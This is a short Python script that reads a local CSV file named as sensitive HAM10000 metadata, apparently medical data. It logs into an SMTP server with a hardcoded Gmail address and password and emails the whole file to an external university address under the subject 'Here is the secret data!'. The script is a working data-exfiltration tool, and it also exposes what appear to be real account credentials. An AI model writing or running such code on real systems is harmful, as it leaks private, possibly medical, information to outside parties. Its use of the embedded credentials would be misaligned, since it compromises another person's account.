import smtplib

EMAIL = 'mfuzzyg@gmail.com'
PASSWORD = 'vjnvhvwkmrqdfrzl'

data = './sensitive_ham10000_metadata.csv'

with open(data, "r") as f:
    data = f.read().replace('\n', ' ')

with smtplib.SMTP('smtp.google.com', 587) as smtp:
    smtp.ehlo()
    smtp.starttls()
    smtp.ehlo()

    smtp.login(EMAIL, PASSWORD)

    SUBJECT = 'Here is the secret data!'

    msg = f"Subject: {SUBJECT}\n\n{data}"

    smtp.sendmail(EMAIL, 'zcabma0@ucl.ac.uk', msg)






